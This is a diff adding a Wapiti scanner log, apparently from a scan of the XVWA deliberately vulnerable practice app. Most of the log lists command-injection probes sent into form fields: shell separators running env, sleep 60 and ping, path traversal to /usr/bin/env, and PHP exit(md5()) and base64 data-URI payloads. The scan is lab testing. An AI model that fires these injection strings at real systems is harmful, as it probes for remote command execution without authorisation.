@@ -1,0 +1,861 @@
+2024-03-20 15:24:10.780 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:10.885 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:10.886 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/sqli/ (1)
+2024-03-20 15:24:11.004 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 15:24:11.005 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_704c1b0f.db
+2024-03-20 15:24:11.009 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 3 URLs and forms during the scan
+2024-03-20 15:24:11.041 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 15:24:11.041 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 15:24:11.122 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 15:24:11.149 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 15:24:11.149 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 15:24:11.161 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli/ (1)
+2024-03-20 15:24:11.171 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:11.211 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:11.260 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 15:24:11.272 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli/ (1)
+2024-03-20 15:24:11.280 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:11.282 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%3Benv%3B&search=
+2024-03-20 15:24:11.295 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%7Cenv%7C&search=
+2024-03-20 15:24:11.306 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=a%3Benv%3B&search=
+2024-03-20 15:24:11.316 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=a%3Benv%3B&search=
+2024-03-20 15:24:11.326 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&search=
+2024-03-20 15:24:11.336 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%3Benv%3B&search=
+2024-03-20 15:24:11.346 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%0Aenv%3B&search=
+2024-03-20 15:24:11.359 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%26set%26&search=
+2024-03-20 15:24:11.369 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=set&search=
+2024-03-20 15:24:11.379 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=env&search=
+2024-03-20 15:24:11.389 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%2Fe%00&search=
+2024-03-20 15:24:11.399 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:11.408 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:11.418 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:11.427 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:11.436 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:11.445 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:11.453 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:11.461 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:11.470 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:11.479 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:11.493 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&search=
+2024-03-20 15:24:11.506 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&search=
+2024-03-20 15:24:11.520 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&search=
+2024-03-20 15:24:11.530 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=a%60%29%60&search=
+2024-03-20 15:24:11.540 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=a%60sleep%2060%60&search=
+2024-03-20 15:24:11.551 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=a%3Bsleep%2060%3B&search=
+2024-03-20 15:24:11.560 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=a%7Csleep%2060%3B&search=
+2024-03-20 15:24:11.569 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%26ping%20-n%2025%20127.0.0.1%26&search=
+2024-03-20 15:24:11.579 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%3Benv%3B
+2024-03-20 15:24:11.589 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%7Cenv%7C
+2024-03-20 15:24:11.599 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=a%3Benv%3B
+2024-03-20 15:24:11.608 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=a%3Benv%3B
+2024-03-20 15:24:11.619 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 15:24:11.629 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%3Benv%3B
+2024-03-20 15:24:11.640 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%0Aenv%3B
+2024-03-20 15:24:11.652 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%26set%26
+2024-03-20 15:24:11.661 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=set
+2024-03-20 15:24:11.671 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=env
+2024-03-20 15:24:11.681 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%2Fe%00
+2024-03-20 15:24:11.690 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:11.703 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:11.713 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:11.725 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:11.738 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:11.750 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:11.760 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:11.772 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:11.786 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:11.800 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:11.813 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:11.826 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:11.837 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 15:24:11.851 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=a%60%29%60
+2024-03-20 15:24:11.861 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=a%60sleep%2060%60
+2024-03-20 15:24:11.870 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=a%3Bsleep%2060%3B
+2024-03-20 15:24:11.883 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=a%7Csleep%2060%3B
+2024-03-20 15:24:11.892 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 15:24:11.910 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:11.911 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%3Benv%3B&item=10
+2024-03-20 15:24:11.921 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%7Cenv%7C&item=10
+2024-03-20 15:24:11.930 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=a%3Benv%3B&item=10
+2024-03-20 15:24:11.941 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=a%3Benv%3B&item=10
+2024-03-20 15:24:11.953 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&item=10
+2024-03-20 15:24:11.966 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%3Benv%3B&item=10
+2024-03-20 15:24:11.977 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%0Aenv%3B&item=10
+2024-03-20 15:24:11.989 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%26set%26&item=10
+2024-03-20 15:24:12.001 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=set&item=10
+2024-03-20 15:24:12.011 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=env&item=10
+2024-03-20 15:24:12.021 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%2Fe%00&item=10
+2024-03-20 15:24:12.031 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:12.040 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:12.051 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:12.062 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:12.074 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:12.086 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:12.097 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:12.108 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:12.118 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:12.130 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:12.139 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&item=10
+2024-03-20 15:24:12.149 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&item=10
+2024-03-20 15:24:12.158 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&item=10
+2024-03-20 15:24:12.168 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=a%60%29%60&item=10
+2024-03-20 15:24:12.178 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=a%60sleep%2060%60&item=10
+2024-03-20 15:24:12.190 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=a%3Bsleep%2060%3B&item=10
+2024-03-20 15:24:12.199 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=a%7Csleep%2060%3B&item=10
+2024-03-20 15:24:12.208 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=%26ping%20-n%2025%20127.0.0.1%26&item=10
+2024-03-20 15:24:12.218 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%3Benv%3B
+2024-03-20 15:24:12.227 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%7Cenv%7C
+2024-03-20 15:24:12.237 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=a%3Benv%3B
+2024-03-20 15:24:12.247 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=a%3Benv%3B
+2024-03-20 15:24:12.257 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 15:24:12.265 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%3Benv%3B
+2024-03-20 15:24:12.274 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%0Aenv%3B
+2024-03-20 15:24:12.283 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%26set%26
+2024-03-20 15:24:12.290 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=set
+2024-03-20 15:24:12.300 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=env
+2024-03-20 15:24:12.311 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%2Fe%00
+2024-03-20 15:24:12.327 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:12.338 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:12.350 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:12.361 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:12.374 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:12.386 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:12.395 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:12.406 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:12.417 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:12.428 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:12.439 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 15:24:12.449 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 15:24:12.459 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 15:24:12.471 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=a%60%29%60
+2024-03-20 15:24:12.480 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=a%60sleep%2060%60
+2024-03-20 15:24:12.491 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=a%3Bsleep%2060%3B
+2024-03-20 15:24:12.503 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=a%7Csleep%2060%3B
+2024-03-20 15:24:12.514 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 15:24:12.548 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 15:24:12.559 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli/ (1)
